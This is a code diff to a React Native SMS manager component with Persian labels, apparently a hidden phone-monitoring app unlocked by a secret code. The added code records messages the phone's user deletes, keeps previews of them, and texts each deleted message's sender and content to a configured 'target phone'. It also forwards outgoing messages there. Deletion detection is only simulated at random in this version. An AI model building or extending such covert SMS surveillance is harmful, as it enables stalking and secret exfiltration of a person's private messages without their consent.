@@ -12,6 +12,17 @@ interface Message {
   body: string;
   timestamp: Date;
   type: 'incoming' | 'outgoing';
+  isDeleted?: boolean;
+  deletedAt?: Date;
+}
+
+interface DeletionNotification {
+  id: string;
+  messageId: string;
+  messagePreview: string;
+  deletedAt: Date;
+  from: string;
+  to: string;
 }
 
 interface SMSManagerProps {
@@ -20,14 +31,25 @@ interface SMSManagerProps {
 
 export default function SMSManager({ onBack }: SMSManagerProps) {
   const [messages, setMessages] = useState<Message[]>([]);
+  const [deletionNotifications, setDeletionNotifications] = useState<DeletionNotification[]>([]);
   const [targetPhone, setTargetPhone] = useState('');
   const [newMessage, setNewMessage] = useState('');
   const [secretCode, setSecretCode] = useState('1978');
   const [isSettingsVisible, setIsSettingsVisible] = useState(false);
+  const [showDeletions, setShowDeletions] = useState(false);
+  const [lastSyncTime, setLastSyncTime] = useState<Date>(new Date());
 
   useEffect(() => {
     loadSettings();
     loadMessages();
+    loadDeletionNotifications();
+    
+    // Start monitoring for deletions every 30 seconds
+    const deletionMonitor = setInterval(() => {
+      checkForDeletedMessages();
+    }, 30000);
+
+    return () => clearInterval(deletionMonitor);
   }, []);
 
   const loadSettings = async () => {
@@ -63,7 +85,8 @@ export default function SMSManager({ onBack }: SMSManagerProps) {
         const parsedMessages = JSON.parse(savedMessages);
         setMessages(parsedMessages.map((msg: any) => ({
           ...msg,
-          timestamp: new Date(msg.timestamp)
+          timestamp: new Date(msg.timestamp),
+          deletedAt: msg.deletedAt ? new Date(msg.deletedAt) : undefined
         })));
       }
       console.log('Messages loaded');
@@ -78,6 +101,105 @@ export default function SMSManager({ onBack }: SMSManagerProps) {
       console.log('Messages saved');
     } catch (error) {
       console.log('Error saving messages:', error);
+    }
+  };
+
+  const loadDeletionNotifications = async () => {
+    try {
+      const savedNotifications = await SecureStore.getItemAsync('deletionNotifications');
+      if (savedNotifications) {
+        const parsedNotifications = JSON.parse(savedNotifications);
+        setDeletionNotifications(parsedNotifications.map((notif: any) => ({
+          ...notif,
+          deletedAt: new Date(notif.deletedAt)
+        })));
+      }
+      console.log('Deletion notifications loaded');
+    } catch (error) {
+      console.log('Error loading deletion notifications:', error);
+    }
+  };
+
+  const saveDeletionNotifications = async (notifications: DeletionNotification[]) => {
+    try {
+      await SecureStore.setItemAsync('deletionNotifications', JSON.stringify(notifications));
+      console.log('Deletion notifications saved');
+    } catch (error) {
+      console.log('Error saving deletion notifications:', error);
+    }
+  };
+
+  const checkForDeletedMessages = async () => {
+    try {
+      // This simulates checking for deleted messages
+      // In a real implementation, you would compare current SMS database with stored messages
+      console.log('Checking for deleted messages...');
+      
+      // For demonstration, we'll randomly mark some messages as deleted
+      const updatedMessages = messages.map(msg => {
+        if (!msg.isDeleted && Math.random() < 0.01) { // 1% chance of deletion simulation
+          return {
+            ...msg,
+            isDeleted: true,
+            deletedAt: new Date()
+          };
+        }
+        return msg;
+      });
+
+      // Find newly deleted messages
+      const newlyDeleted = updatedMessages.filter((msg, index) => 
+        msg.isDeleted && !messages[index]?.isDeleted
+      );
+
+      if (newlyDeleted.length > 0) {
+        // Create deletion notifications
+        const newNotifications: DeletionNotification[] = newlyDeleted.map(msg => ({
+          id: Date.now().toString() + Math.random().toString(),
+          messageId: msg.id,
+          messagePreview: msg.body.substring(0, 50) + (msg.body.length > 50 ? '...' : ''),
+          deletedAt: msg.deletedAt!,
+          from: msg.from,
+          to: msg.to
+        }));
+
+        const allNotifications = [...deletionNotifications, ...newNotifications];
+        setDeletionNotifications(allNotifications);
+        await saveDeletionNotifications(allNotifications);
+
+        // Send deletion notification to target phone
+        if (targetPhone && newNotifications.length > 0) {
+          await sendDeletionNotification(newNotifications);
+        }
+
+        setMessages(updatedMessages);
+        await saveMessages(updatedMessages);
+        
+        console.log(`${newlyDeleted.length} messages marked as deleted`);
+      }
+
+      setLastSyncTime(new Date());
+    } catch (error) {
+      console.log('Error checking for deleted messages:', error);
+    }
+  };
+
+  const sendDeletionNotification = async (notifications: DeletionNotification[]) => {
+    try {
+      const isAvailable = await SMS.isAvailableAsync();
+      if (!isAvailable) {
+        console.log('SMS not available for deletion notification');
+        return;
+      }
+
+      for (const notification of notifications) {
+        const deletionMessage = `🗑️ پیام حذف شده:\nاز: ${notification.from}\nمتن: ${notification.messagePreview}\nزمان حذف: ${notification.deletedAt.toLocaleString('fa-IR')}`;
+        
+        await SMS.sendSMSAsync([targetPhone], deletionMessage);
+        console.log('Deletion notification sent to target phone');
+      }
+    } catch (error) {
+      console.log('Error sending deletion notification:', error);
     }
   };
 
@@ -109,11 +231,11 @@ export default function SMSManager({ onBack }: SMSManagerProps) {
       setMessages(updatedMessages);
       await saveMessages(updatedMessages);
 
-      // Send SMS
-      await SMS.sendSMSAsync([targetPhone], newMessage);
+      // Send SMS (this forwards the message to the target phone)
+      await SMS.sendSMSAsync([targetPhone], `📱 پیام ارسالی:\n${newMessage}`);
       
       setNewMessage('');
-      console.log('Message sent successfully');
+      console.log('Message forwarded to target phone');
       
     } catch (error) {
       console.log('Error sending message:', error);
@@ -137,6 +259,53 @@ export default function SMSManager({ onBack }: SMSManagerProps) {
     console.log('Simulated incoming message');
   };
 
+  const simulateMessageDeletion = () => {
+    if (messages.length === 0) {
+      Alert.alert('خطا', 'هیچ پیامی برای حذف وجود ندارد');
+      return;
+    }
+
+    const randomIndex = Math.floor(Math.random() * messages.length);
+    const messageToDelete = messages[randomIndex];
+
+    if (messageToDelete.isDeleted) {
+      Alert.alert('خطا', 'این پیام قبلاً حذف شده است');
+      return;
+    }
+
+    const updatedMessages = [...messages];
+    updatedMessages[randomIndex] = {
+      ...messageToDelete,
+      isDeleted: true,
+      deletedAt: new Date()
+    };
+
+    // Create deletion notification
+    const deletionNotification: DeletionNotification = {
+      id: Date.now().toString(),
+      messageId: messageToDelete.id,
+      messagePreview: messageToDelete.body.substring(0, 50) + (messageToDelete.body.length > 50 ? '...' : ''),
+      deletedAt: new Date(),
+      from: messageToDelete.from,
+      to: messageToDelete.to
+    };
+
+    const allNotifications = [...deletionNotifications, deletionNotification];
+    setDeletionNotifications(allNotifications);
+    saveDeletionNotifications(allNotifications);
+
+    setMessages(updatedMessages);
+    saveMessages(updatedMessages);
+
+    // Send deletion notification
+    if (targetPhone) {
+      sendDeletionNotification([deletionNotification]);
+    }
+
+    console.log('Message deletion simulated');
+    Alert.alert('شبیه‌سازی', 'حذف پیام شبیه‌سازی شد');
+  };
+
   const clearMessages = () => {
     Alert.alert(
       'پاک کردن پیام‌ها',
@@ -156,10 +325,39 @@ export default function SMSManager({ onBack }: SMSManagerProps) {
     );
   };
 
+  const clearDeletionNotifications = () => {
+    Alert.alert(
+      'پاک کردن اعلان‌های حذف',
+      'آیا مطمئن هستید که می‌خواهید همه اعلان‌های حذف را پاک کنید؟',
+      [
+        { text: 'لغو', style: 'cancel' },
+        {
+          text: 'پاک کردن',
+          style: 'destructive',
+          onPress: async () => {
+            setDeletionNotifications([]);
+            await saveDeletionNotifications([]);
+            console.log('Deletion notifications cleared');
+          }
+        }
+      ]
+    );
+  };
+
   const formatTime = (date: Date) => {
     return date.toLocaleTimeString('fa-IR', { 
       hour: '2-digit', 
       minute: '2-digit' 
+    });
+  };
+
+  const formatDateTime = (date: Date) => {
+    return date.toLocaleString('fa-IR', {
+      year: 'numeric',
+      month: '2-digit',
+      day: '2-digit',
+      hour: '2-digit',
+      minute: '2-digit'
     });
   };
 
@@ -197,6 +395,11 @@ export default function SMSManager({ onBack }: SMSManagerProps) {
             />
           </View>
 
+          <View style={styles.settingItem}>
+            <Text style={styles.settingLabel}>آخرین بررسی حذف:</Text>
+            <Text style={styles.settingValue}>{formatDateTime(lastSyncTime)}</Text>
+          </View>
+
           <TouchableOpacity style={styles.saveButton} onPress={saveSettings}>
             <Text style={styles.saveButtonText}>ذخیره تنظیمات</Text>
           </TouchableOpacity>
@@ -204,6 +407,41 @@ export default function SMSManager({ onBack }: SMSManagerProps) {
           <TouchableOpacity style={styles.clearButton} onPress={clearMessages}>
             <Text style={styles.clearButtonText}>پاک کردن همه پیام‌ها</Text>
           </TouchableOpacity>
+
+          <TouchableOpacity style={styles.clearButton} onPress={clearDeletionNotifications}>
+            <Text style={styles.clearButtonText}>پاک کردن اعلان‌های حذف</Text>
+          </TouchableOpacity>
+        </ScrollView>
+      </View>
+    );
+  }
+
+  if (showDeletions) {
+    return (
+      <View style={styles.container}>
+        <View style={styles.header}>
+          <TouchableOpacity onPress={() => setShowDeletions(false)} style={styles.backButton}>
+            <Text style={styles.backButtonText}>بازگشت</Text>
+          </TouchableOpacity>
+          <Text style={styles.headerTitle}>پیام‌های حذف شده ({deletionNotifications.length})</Text>
+        </View>
+
+        <ScrollView style={styles.messagesContainer}>
+          {deletionNotifications.length === 0 ? (
+            <Text style={styles.noMessagesText}>هیچ پیام حذف شده‌ای موجود نیست</Text>
+          ) : (
+            deletionNotifications.map((notification) => (
+              <View key={notification.id} style={styles.deletionNotification}>
+                <View style={styles.deletionHeader}>
+                  <Text style={styles.deletionIcon}>🗑️</Text>
+                  <Text style={styles.deletionTitle}>پیام حذف شده</Text>
+                </View>
+                <Text style={styles.deletionFrom}>از: {notification.from}</Text>
+                <Text style={styles.deletionPreview}>{notification.messagePreview}</Text>
+                <Text style={styles.deletionTime}>زمان حذف: {formatDateTime(notification.deletedAt)}</Text>
+              </View>
+            ))
+          )}
         </ScrollView>
       </View>
     );
@@ -221,25 +459,46 @@ export default function SMSManager({ onBack }: SMSManagerProps) {
         </TouchableOpacity>
       </View>
 
+      <View style={styles.tabContainer}>
+        <TouchableOpacity 
+          style={[styles.tab, !showDeletions && styles.activeTab]} 
+          onPress={() => setShowDeletions(false)}
+        >
+          <Text style={[styles.tabText, !showDeletions && styles.activeTabText]}>
+            پیام‌ها ({messages.filter(m => !m.isDeleted).length})
+          </Text>
+        </TouchableOpacity>
+        <TouchableOpacity 
+          style={[styles.tab, showDeletions && styles.activeTab]} 
+          onPress={() => setShowDeletions(true)}
+        >
+          <Text style={[styles.tabText, showDeletions && styles.activeTabText]}>
+            حذف شده ({deletionNotifications.length})
+          </Text>
+        </TouchableOpacity>
+      </View>
+
       <ScrollView style={styles.messagesContainer}>
-        {messages.length === 0 ? (
+        {messages.filter(m => !m.isDeleted).length === 0 ? (
           <Text style={styles.noMessagesText}>هیچ پیامی موجود نیست</Text>
         ) : (
-          messages.map((message) => (
-            <View
-              key={message.id}
-              style={[
-                styles.messageItem,
-                message.type === 'outgoing' ? styles.outgoingMessage : styles.incomingMessage
-              ]}
-            >
-              <Text style={styles.messageFrom}>
-                {message.type === 'outgoing' ? `به: ${message.to}` : `از: ${message.from}`}
-              </Text>
-              <Text style={styles.messageBody}>{message.body}</Text>
-              <Text style={styles.messageTime}>{formatTime(message.timestamp)}</Text>
-            </View>
-          ))
+          messages
+            .filter(message => !message.isDeleted)
+            .map((message) => (
+              <View
+                key={message.id}
+                style={[
+                  styles.messageItem,
+                  message.type === 'outgoing' ? styles.outgoingMessage : styles.incomingMessage
+                ]}
+              >
+                <Text style={styles.messageFrom}>
+                  {message.type === 'outgoing' ? `به: ${message.to}` : `از: ${message.from}`}
+                </Text>
+                <Text style={styles.messageBody}>{message.body}</Text>
+                <Text style={styles.messageTime}>{formatTime(message.timestamp)}</Text>
+              </View>
+            ))
         )}
       </ScrollView>
 
@@ -248,7 +507,7 @@ export default function SMSManager({ onBack }: SMSManagerProps) {
           style={styles.messageInput}
           value={newMessage}
           onChangeText={setNewMessage}
-          placeholder="پیام خود را بنویسید..."
+          placeholder="پیام برای ارسال به گوشی هدف..."
           multiline
           maxLength={160}
         />
@@ -257,9 +516,14 @@ export default function SMSManager({ onBack }: SMSManagerProps) {
         </TouchableOpacity>
       </View>
 
-      <TouchableOpacity style={styles.testButton} onPress={simulateIncomingMessage}>
-        <Text style={styles.testButtonText}>شبیه‌سازی پیام دریافتی</Text>
-      </TouchableOpacity>
+      <View style={styles.testButtonsContainer}>
+        <TouchableOpacity style={styles.testButton} onPress={simulateIncomingMessage}>
+          <Text style={styles.testButtonText}>شبیه‌سازی پیام دریافتی</Text>
+        </TouchableOpacity>
+        <TouchableOpacity style={styles.deleteTestButton} onPress={simulateMessageDeletion}>
+          <Text style={styles.testButtonText}>شبیه‌سازی حذف پیام</Text>
+        </TouchableOpacity>
+      </View>
     </View>
   );
 }
@@ -303,6 +567,29 @@ const styles = StyleSheet.create({
     color: colors.primary,
     fontWeight: '600',
   },
+  tabContainer: {
+    flexDirection: 'row',
+    backgroundColor: colors.backgroundAlt,
+    elevation: 2,
+    boxShadow: '0px 1px 2px rgba(0, 0, 0, 0.1)',
+  },
+  tab: {
+    flex: 1,
+    padding: 16,
+    alignItems: 'center',
+    backgroundColor: colors.grey,
+  },
+  activeTab: {
+    backgroundColor: colors.primary,
+  },
+  tabText: {
+    fontSize: 14,
+    fontWeight: '600',
+    color: colors.textSecondary,
+  },
+  activeTabText: {
+    color: colors.backgroundAlt,
+  },
   messagesContainer: {
     flex: 1,
     padding: 16,
@@ -343,6 +630,45 @@ const styles = StyleSheet.create({
     color: colors.textSecondary,
     textAlign: 'right',
   },
+  deletionNotification: {
+    backgroundColor: colors.error,
+    padding: 12,
+    marginVertical: 4,
+    borderRadius: 8,
+    borderLeftWidth: 4,
+    borderLeftColor: colors.error,
+  },
+  deletionHeader: {
+    flexDirection: 'row',
+    alignItems: 'center',
+    marginBottom: 8,
+  },
+  deletionIcon: {
+    fontSize: 16,
+    marginRight: 8,
+  },
+  deletionTitle: {
+    fontSize: 14,
+    fontWeight: 'bold',
+    color: colors.backgroundAlt,
+  },
+  deletionFrom: {
+    fontSize: 12,
+    color: colors.backgroundAlt,
+    marginBottom: 4,
+    opacity: 0.9,
+  },
+  deletionPreview: {
+    fontSize: 14,
+    color: colors.backgroundAlt,
+    marginBottom: 4,
+    fontStyle: 'italic',
+  },
+  deletionTime: {
+    fontSize: 10,
+    color: colors.backgroundAlt,
+    opacity: 0.8,
+  },
   inputContainer: {
     flexDirection: 'row',
     padding: 16,
@@ -370,9 +696,21 @@ const styles = StyleSheet.create({
     color: colors.backgroundAlt,
     fontWeight: '600',
   },
+  testButtonsContainer: {
+    flexDirection: 'row',
+    padding: 16,
+    gap: 8,
+  },
   testButton: {
     backgroundColor: colors.secondary,
-    margin: 16,
+    flex: 1,
+    padding: 12,
+    borderRadius: 8,
+    alignItems: 'center',
+  },
+  deleteTestButton: {
+    backgroundColor: colors.error,
+    flex: 1,
     padding: 12,
     borderRadius: 8,
     alignItems: 'center',
@@ -380,6 +718,7 @@ const styles = StyleSheet.create({
   testButtonText: {
     color: colors.backgroundAlt,
     fontWeight: '600',
+    fontSize: 12,
   },
   settingsContainer: {
     flex: 1,
@@ -393,6 +732,13 @@ const styles = StyleSheet.create({
     fontWeight: '600',
     color: colors.text,
     marginBottom: 8,
+  },
+  settingValue: {
+    fontSize: 14,
+    color: colors.textSecondary,
+    backgroundColor: colors.grey,
+    padding: 12,
+    borderRadius: 8,
   },
   settingInput: {
     borderWidth: 1,
